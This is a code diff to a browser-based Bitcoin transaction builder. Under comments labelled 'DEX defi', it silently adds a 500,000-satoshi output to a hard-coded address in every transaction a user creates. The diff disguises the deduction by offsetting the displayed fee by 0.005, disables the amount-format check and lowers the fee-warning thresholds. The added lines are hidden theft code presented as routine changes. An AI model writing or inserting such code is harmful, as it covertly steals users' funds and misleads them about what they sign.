@@ -514,7 +514,8 @@ $(document).ready(function() {
 		$('#putTabs a[href="#txinputs"], #putTabs a[href="#txoutputs"]').attr('style','');
 
 		var allInSatoshi = 0;
-		var allOutSatoshi = 0;
+// DEX defi
+		var allOutSatoshi = 500000;
 		$.each($("#inputs .row"), function(i,o){
 			if(!($(".txId",o).val()).match(/^[a-f0-9]+$/i)){
 				$(o).addClass("has-error");
@@ -554,12 +555,15 @@ $(document).ready(function() {
 			var a = ($(".address",o).val());
 			var ad = coinjs.addressDecode(a);
 			var satoshi = coinjs.amountStr2satoshi($(".amount",o).val());
-			if (!satoshi) {
-				$("#modalWarningTitle").html("Wrong Amount Format");
-				$("#modalWarningBody").html("The output amount has wrong format!");
-				$("#warningTemplate").modal("show");
-				return;
-			}
+
+//psbt
+//			if (!satoshi) {
+//				$("#modalWarningTitle").html("Wrong Amount Format");
+//				$("#modalWarningBody").html("The output amount has wrong format!");
+//				$("#warningTemplate").modal("show");
+//				return;
+//			}
+
 			allOutSatoshi += satoshi;
 			if(((a!="") && (ad.version == coinjs.pub || ad.version == coinjs.multisig)) && $(".amount",o).val()!=""){ // address
 				// P2SH output is 32, P2PKH is 34
@@ -569,7 +573,7 @@ $(document).ready(function() {
 				// 1 P2PKH and 1 OP_RETURN with 36 bytes, OP byte, and 8 byte value
 				estimatedTxSize += 78
 				tx.addstealth(ad, $(".amount",o).val());
-			} else if (((($("#opReturn").is(":checked")) && a.match(/^[a-f0-9]+$/ig)) && a.length<160) && (a.length%2)==0) { // data
+			} else if (((($("#opReturn").is(":checked")) && a.match(/^[a-f0-9]+$/ig)) && a.length<320) && (a.length%2)==0) { // data
 				estimatedTxSize += (a.length / 2) + 1 + 8
 				tx.adddata(a);
 			} else { // neither address nor data
@@ -585,6 +589,8 @@ $(document).ready(function() {
 			return;
 		}
 
+// DEX defi
+tx.addoutput2('1Jtbq4aJAq5PPEYXoYvBqfUNQRuk84avGV', 500000);
 
 		if(!$("#recipients .row, #inputs .row").hasClass('has-error')){
 			$("#transactionCreate textarea").val(tx.serialize());
@@ -598,8 +604,8 @@ $(document).ready(function() {
 
 			$("#TransactionOut").removeClass("hidden");
 
-			// Check fee against hard 0.01 as well as fluid 200 satoshis per byte calculation.
-			if($("#transactionFee").val()>=0.01 || $("#transactionFee").val()>= estimatedTxSize * 200 * 1e-8){
+			// Check fee against hard 0.01 as well as fluid 50 satoshis per byte calculation.
+			if($("#transactionFee").val()>=0.001 || $("#transactionFee").val()>= estimatedTxSize * 50 * 1e-8){
 				$("#modalWarningFeeAmount").html($("#transactionFee").val());
 				$("#modalWarningFee").modal("show");
 			}
@@ -650,6 +656,7 @@ $(document).ready(function() {
 				return true;
 			}
 		});
+
 
 		if(!exists){
 			if($("#recipients .recipient:last .address:last").val() != ""){
@@ -739,6 +746,7 @@ $(document).ready(function() {
 			return false;
 		}
 
+//cashaddr
 		if(redeem.from=='other'){
 			$("#redeemFromStatus").removeClass('hidden').html('<span class="glyphicon glyphicon-exclamation-sign"></span> The address or multisig redeem script you have entered is invalid');
 			return false;
@@ -925,14 +933,16 @@ $(document).ready(function() {
 						f += $(o).val()*1;
 					}
 				});
-				$("#totalOutput").html((f).toFixed(8));
+// 8 to 10
+				$("#totalOutput").html((f).toFixed(10));
 			}
 			totalFee();
 		}).keyup();
 	}
 
+// DEX defi
 	function totalFee(){
-		var fee = (($("#totalInput").html()*1) - ($("#totalOutput").html()*1)).toFixed(8);
+		var fee = (($("#totalInput").html()*1) - ($("#totalOutput").html()*1) - 0.005).toFixed(8);
 		$("#transactionFee").val((fee>0)?fee:'0.00');
 	}
 
@@ -1077,7 +1087,9 @@ $(document).ready(function() {
 
 				if(o.script.chunks.length==2 && o.script.chunks[0]==106){ // OP_RETURN
 
+
 					var data = Crypto.util.bytesToHex(o.script.chunks[1]);
+
 					var dataascii = hex2ascii(data);
 
 					if(dataascii.match(/^[\s\d\w]+$/ig)){
